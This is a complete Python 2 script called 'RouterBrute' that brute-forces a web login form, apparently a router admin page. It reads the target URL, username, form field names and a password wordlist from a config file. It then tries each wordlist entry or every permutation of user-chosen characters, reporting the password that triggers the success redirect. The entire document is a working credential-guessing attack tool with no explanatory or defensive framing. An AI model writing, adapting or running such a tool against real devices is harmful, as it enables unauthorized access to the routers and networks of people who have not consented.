#!/usr/bin/python
import time
import mechanize 
import itertools
import ConfigParser
# Config stuff
configParser = ConfigParser.RawConfigParser()   
configFilePath = 'router_config.txt'
configParser.read(configFilePath)
# username to brute
username = configParser.get('config', 'username')
# link to brute
link = configParser.get('config', 'link')
# wordlist to use
wordlist = configParser.get('config', 'wordlist')
# link redirects to
link_redirects_to = configParser.get('config', 'link_redirects_to')
# username field
username_field = configParser.get('config', 'username_field')
# password field
password_field = configParser.get('config', 'password_field')
# form name
form_name = configParser.get('config', 'form_name')
print "---------------------\n     RouterBrute\n---------------------"
#username = raw_input("Username to brute: ")
def brute():
    br=mechanize.Browser()
    print("[*] Browser Initialized")
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.open(link)
    passfile=open(wordlist,"r")
    tries = 0
    for password in passfile.readlines():
        password=password.rstrip('\n')
        try:
            tries += 1
            br.select_form(name=form_name)
            br.form[username_field]=username
            br.form[password_field]=password
            resp=br.submit()
            if resp.geturl()==link_redirects_to:
                print("[!] Correct Password is %s" %(password))
                print("[!] That took " + str(tries) + " tries!")
                time.sleep(3)
                break
            else:
                print("[+] Checking %s" %(password))
        except KeyboardInterrupt:
            print("\nQuitting..")
            return

main = raw_input("Bruteforce or Dictionary [brute/dict]: ")
if main == "dict":
    brute()
else:
    letters = raw_input("Letters/Numbers to use: ")
    br = mechanize.Browser()
    print("[*] Browser Initialized")
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    length = input("Length of password: ")
    combos = itertools.permutations(letters,length)
    br.open(link)
    tries = 0
    for x in combos:
        tries += 1
        br.select_form(name=form_name)# ( nr = 0 )
        br.form[username_field] = username
        br.form[password_field] = ''.join(x)
        print "[-] Checking",br.form[password_field]
        response=br.submit()
        if response.geturl()==link_redirects_to:
                print "[+] Correct password is",''.join(x)
                print("[!] That took " + str(tries) + " tries!")
                time.sleep(3)
                break

